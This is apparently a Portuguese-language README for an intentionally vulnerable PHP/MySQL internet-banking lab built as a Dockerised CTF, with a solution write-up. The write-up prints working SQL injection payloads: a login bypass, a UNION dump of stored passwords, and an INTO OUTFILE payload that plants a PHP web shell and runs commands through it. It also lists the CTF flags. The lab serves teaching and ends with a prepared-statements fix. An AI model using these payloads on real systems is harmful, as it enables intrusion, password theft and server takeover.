<div align="center">
  <h1>
    Laboratório de Injeção de SQL (CTF Edition) 🏦
  </h1>
</div>

<p align="center">
  <img alt="Linguagem Principal" src="https://img.shields.io/github/languages/top/vrsmarcos26/Lab-SQL-INJECTION-EDUCACIONAL?style=for-the-badge&color=563D7C">
  <img alt="Licença" src="https://img.shields.io/github/license/vrsmarcos26/Lab-SQL-INJECTION-EDUCACIONAL?style=for-the-badge&color=blue">
  <img alt="Último Commit" src="https://img.shields.io/github/last-commit/vrsmarcos26/Lab-SQL-INJECTION-EDUCACIONAL?style=for-the-badge&color=green">
</p>

<p align="center">
  Um simulador de Internet Banking (Aegis Bank) intencionalmente vulnerável a Injeção de SQL. Construído como um laboratório prático (CTF) para explorar desde bypass de autenticação até Execução Remota de Código (RCE) em um ambiente conteinerizado.
</p>

<p align="center">
  <a href="#-aviso-importante">Aviso</a> •
  <a href="#-objetivos-de-aprendizagem">Objetivos</a> •
  <a href="#-tecnologias-utilizadas">Tecnologias</a> •
  <a href="#-como-acessar-o-laboratório">Como Acessar</a> •
  <a href="#-jornada-de-exploração-ctf">Exploração (CTF)</a> •
  <a href="#-créditos">Créditos</a>
</p>

---

### ⚠️ Aviso Importante

> **Este projeto é intencionalmente vulnerável.** Ele foi criado para fins estritamente educacionais e demonstração de falhas web em ambientes controlados. **NÃO FAÇA O DEPLOY DA VERSÃO DOCKER EM UM SERVIDOR PÚBLICO OU DE PRODUÇÃO.**

---

### 🎯 Objetivos de Aprendizagem

Este laboratório foi projetado para demonstrar vulnerabilidades no Back-end originadas pela falta de tratamento na comunicação com o banco de dados. Você aprenderá:

- A mecânica do **SQL Injection Básico**, manipulando operadores lógicos para subverter a lógica de autenticação.
- Técnicas de **Exfiltração de Dados (UNION-Based)**, quebrando a consulta original para extrair tabelas inteiras.
- O impacto crítico de falhas de configuração de privilégios, culminando em **Remote Code Execution (RCE)** através da gravação de arquivos físicos no servidor.

---

### 🛠️ Tecnologias Utilizadas

Este ambiente foi estruturado utilizando:

<p align="center">
  <a href="https://www.php.net/"><img src="https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" alt="PHP"></a>
  <a href="https://www.mysql.com/"><img src="https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white" alt="MySQL"></a>
  <a href="https://tailwindcss.com/"><img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" alt="Tailwind"></a>
  <a href="https://www.docker.com/"><img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker"></a>
</p>

---

### ⚙️ Como Acessar o Laboratório

Este laboratório possui duas formas de execução, permitindo que você estude da maneira mais conveniente:

#### **Opção 1: Simulador Web (Estudo Básico)**
Uma versão interativa Front-end hospedada no GitHub Pages. Perfeita para testar a sintaxe dos payloads de injeção diretamente no navegador, sem precisar instalar dependências.
🔗 **[Acesse o simulador aqui](https://vrsmarcos26.github.io/Lab-SQL-INJECTION-EDUCACIONAL/simulador/)**

#### **Opção 2: Servidor Real (CTF Completo - Via Docker)**
A experiência ofensiva definitiva. Uma infraestrutura com Back-end em PHP conectado a um contêiner MySQL real, com volumes compartilhados e permissões estritas configuradas[cite: 29].
1. Clone o Repositório:
```bash
git clone https://github.com/vrsmarcos26/Lab-SQL-INJECTION-EDUCACIONAL.git
cd Lab-SQL-INJECTION-EDUCACIONAL
```

2. Construa e suba o ambiente através do Docker
```bash
sudo docker-compose up --build -d
```

3. Acesse a aplicação no seu navegador: http://localhost:8000

### 🎬 Jornada de Exploração (CTF)

O portal corporativo do Aegis Bank esconde falhas críticas na forma como processa o login. Sua missão é escalar seu acesso em 3 níveis de severidade:

#### 🚩 Nível 1: Bypass de Autenticação (Acesso Inicial)
A tela de login confia cegamente no que é digitado. Sua missão é descobrir como manipular os operadores lógicos (como `OR`) no campo de senha para fazer com que a verificação do banco de dados sempre retorne uma resposta verdadeira, forçando a entrada no sistema mesmo sem saber nenhuma credencial válida.

#### 🚩 Nível 2: Exfiltração de Dados (UNION-Based)
Entrar no sistema foi apenas o começo. O banco de dados possui uma tabela chamada `users` contendo os dados de dezenas de clientes e administradores. Seu objetivo é injetar um comando que "una" a resposta do seu login com uma listagem completa dessa tabela, fazendo um *dump* massivo de senhas na tela.

#### 🚩 Nível 3: Remote Code Execution (RCE)
O golpe final. O administrador cometeu um erro fatal ao conceder privilégios globais (`FILE`) ao usuário do banco de dados. Utilize a injeção de SQL para forçar o MySQL a gravar um arquivo contendo código PHP (Web Shell) na pasta compartilhada do servidor web. Depois, acesse esse arquivo pelo navegador para executar comandos diretamente no sistema operacional do servidor.

<details>
<summary><strong>💡 Resolução e Análise Técnica (Write-up)</strong></summary>

<br>

A vulnerabilidade raiz encontra-se no arquivo `login.php`. A entrada do usuário não é higienizada e é concatenada diretamente na query: 
`$sql = "SELECT * FROM users WHERE name = '$user' AND password = '$pass'";`

#### Solução do Nível 1 (Bypass)
Ao inserir `' OR '1'='1' #` no campo de senha, a query se transforma em:
`SELECT * FROM users WHERE name = '...' AND password = '' OR '1'='1' #'`.
Como 1 é sempre igual a 1, a condição se torna verdadeira para a primeira linha da tabela, garantindo o acesso.
* **Flag obtida:** `FLAG{B4S1C_BYP4SS_1S_D0N3}`

#### Solução do Nível 2 (Exfiltração)
O atacante injeta um comando para unir resultados. No campo CPF, usamos um usuário inválido para anular a primeira parte da query, e injetamos a chamada à tabela inteira:
`xxx' UNION SELECT 1, 2, password FROM users #`
* **Flag obtida:** Localizada no meio do dump massivo de dados: `FLAG{1NJ3T4ND0_C0NH3C1M3NT0}`

#### Solução do Nível 3 (RCE)
Abusamos do comando `INTO OUTFILE` do MySQL para gravar arquivos físicos.
Payload no campo CPF:
`xxx' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/lib/mysql-files/shell.php' #`
Após gravar com sucesso, acessamos a shell pelo navegador enviando o comando desejado via GET: `http://localhost:8000/uploads/shell.php?cmd=cat /flag_03.txt`.
* **Flag obtida:** `FLAG{3_SQL1_T0_RC3_M4ST3R}`

**Como Mitigar:** 
O uso de **Prepared Statements (Consultas Parametrizadas)** garante que a entrada do usuário seja tratada estritamente como dado, e nunca como código executável, neutralizando todas essas três técnicas de ataque instantaneamente.

</details>

-----

### 🙌 Créditos

Este projeto foi inspirado nos conceitos práticos de segurança ofensiva do **Hacking Club**, sendo estruturado para o aprimoramento em testes de invasão e pesquisa de vulnerabilidades web.

-----

### 📝 Licença

Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para mais detalhes.

<hr>

<p align="center">
Desenvolvido por <b>vrsmarcos26</b>
</p>